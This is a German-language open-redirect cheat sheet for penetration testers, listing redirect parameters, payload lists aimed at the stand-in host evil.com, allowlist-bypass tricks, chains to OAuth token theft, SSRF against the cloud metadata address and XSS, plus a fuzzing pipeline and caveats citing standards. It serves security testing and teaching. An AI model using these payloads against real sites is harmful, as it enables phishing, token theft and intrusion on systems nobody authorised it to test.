# 🔀 Open-Redirect-Cheatsheet

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
  ██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
  ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
  ╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
   ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
```

---

## 🎯 Was ist ein Open Redirect?

Ein **Open Redirect** (offene Weiterleitung) ermöglicht es Angreifern, Nutzer über einen Link auf einer vertrauenswürdigen Domain auf eine schädliche Website weiterzuleiten. Das kann für Phishing und für Angriffsketten mit weiteren Schwachstellen genutzt werden.

---

## 🔍 Häufige Parameter

```
url=
redirect=
redirect_uri=
redirect_url=
next=
next_url=
return=
return_url=
rurl=
dest=
destination=
redir=
redirect_uri=
return_to=
checkout_url=
continue=
image_url=
go=
view=
to=
out=
ref=
callback=
```

---

## 💉 Payloads

### Grundlegende Beispiele
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=http://evil.com
https://target.com/redirect?url=//evil.com
```

### Ohne explizites Protokoll
```
//evil.com
///evil.com
////evil.com
/\/evil.com
```

### Mit dem @-Zeichen
```
https://target.com@evil.com
https://target.com%40evil.com
//target.com@evil.com
```

### Tricks mit Backslashes
```
https://evil.com\@target.com
//evil.com\@target.com
https://target.com/redirect?url=https://evil.com\.target.com
```

### URL-Kodierung
```
https://evil.com
https:%2f%2fevil.com
https:%252f%252fevil.com
%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```

### Verwechslung von Domains
```
https://evil.com?.target.com
https://evil.com#.target.com
https://evil.com\.target.com
https://target.com.evil.com
https://targetcom.evil.com
```

### Nullbytes
```
https://evil.com%00.target.com
https://evil.com%00@target.com
```

### CRLF-Injection
```
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### JavaScript-Weiterleitung
```
javascript:alert(1)
javascript://target.com/%0d%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

---

## 🛡️ Techniken zur Umgehung von Prüfungen

### Wenn eine Allowlist geprüft wird
```
# Umgehung über Subdomains
https://target.com.evil.com
https://evil.target.com
https://targetcom.evil.com

# Umgehung über den Pfad
https://target.com/https://evil.com
https://target.com//evil.com
```

### Wenn nur HTTPS erlaubt ist
```
https://evil.com
https://evil.com%2f%2ftarget.com
```

### Tricks mit Localhost
```
http://localhost
http://127.0.0.1
http://[::1]
```

---

## 🔗 Open Redirects mit weiteren Schwachstellen verketten

### Diebstahl von OAuth-Tokens
```
https://target.com/oauth?redirect_uri=https://evil.com
→ OAuth-Tokens stehlen
```

### SSRF-Angriffskette
```
https://target.com/redirect?url=http://169.254.169.254/
```

### XSS-Angriffskette
```
https://target.com/redirect?url=javascript:alert(document.domain)
```

---

## 📊 Schnellübersicht

| Payload-Typ | Beispiel |
|--------------|---------|
| Grundlegend | `//evil.com` |
| @-Zeichen | `https://target.com@evil.com` |
| Kodierung | `https:%2f%2fevil.com` |
| Domain-Verwechslung | `https://target.com.evil.com` |
| JavaScript | `javascript:alert(1)` |

---

## 🛠️ Werkzeuge

```bash
# GF-Muster
gau target.com | gf redirect

# Manuelle Tests
echo "https://target.com/r?url=FUZZ" | \
  qsreplace "https://evil.com" | \
  httpx -silent -location
```

---

## 📚 Weiterführende Quellen

- [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

## 📝 Redaktionelle Hinweise zu den Originalbeispielen

- **URL-Verarbeitung:** Die Beispiele sind Prüffälle, keine allgemein wirksamen Umgehungen. Das Ergebnis hängt vom Parser und von den Dekodierungsschritten ab. Bei `https://target.com@evil.com` ist `evil.com` der Host; der Teil davor sind Zugangsdaten. Ein Backslash kann bei HTTP(S)-URLs wie ein Schrägstrich verarbeitet werden. Prozentkodierte Trennzeichen und Nullbytes sind daher nicht automatisch gleichwertig mit ihren unkodierten Varianten. [WHATWG URL Standard](https://url.spec.whatwg.org/)
- **Domain und Pfad:** Eine URL mit `target.com.evil.com` gehört zu `evil.com`; eine URL mit `evil.target.com` dagegen zu `target.com`. Die Pfadbeispiele unterhalb einer unveränderten Ziel-Domain beweisen für sich keine externe Weiterleitung. Entscheidend sind das tatsächlich ausgewertete Ziel und eine unsichere Validierung. [PortSwigger: Open redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- **OAuth:** Das vereinfachte Beispiel führt nicht automatisch zum Token-Diebstahl. Dafür muss der konkrete OAuth-Ablauf eine Weitergabe von Codes oder Tokens ermöglichen. RFC 9700 fordert für registrierte Redirect-URIs grundsätzlich einen exakten Zeichenkettenvergleich; die Ausnahme betrifft Portnummern bei Localhost-Redirects nativer Anwendungen. [RFC 9700, Abschnitt 2.1](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1)
- **SSRF und Loopback:** Eine Browser-Weiterleitung allein ist keine SSRF. Dafür muss ein serverseitiger HTTP-Client die Weiterleitung tatsächlich verfolgen und das interne Ziel erreichen. Bei einem Browser-Redirect bezeichnet Localhost den Rechner des Nutzers, bei einem serverseitigen Abruf die Umgebung des abrufenden Dienstes. [OWASP: SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- **XSS und CRLF:** Die JavaScript-/Data-Beispiele funktionieren nur bei einer passenden, unsicheren Verarbeitung; eine HTTP-Weiterleitung allein garantiert keine Skriptausführung. Das CRLF-Beispiel benötigt zusätzlich eine unsichere Verarbeitung im Response-Header. CR und LF sind in HTTP-Feldwerten unzulässig. [PortSwigger: DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection), [RFC 9110, Abschnitt 5.5](https://www.rfc-editor.org/rfc/rfc9110.html#section-5.5)

---

<p align="center">
  <b>🔀 Weiterleitungen auf Schwachstellen prüfen!</b><br>
  <i>Nur für ausdrücklich autorisierte Tests!</i>
</p>
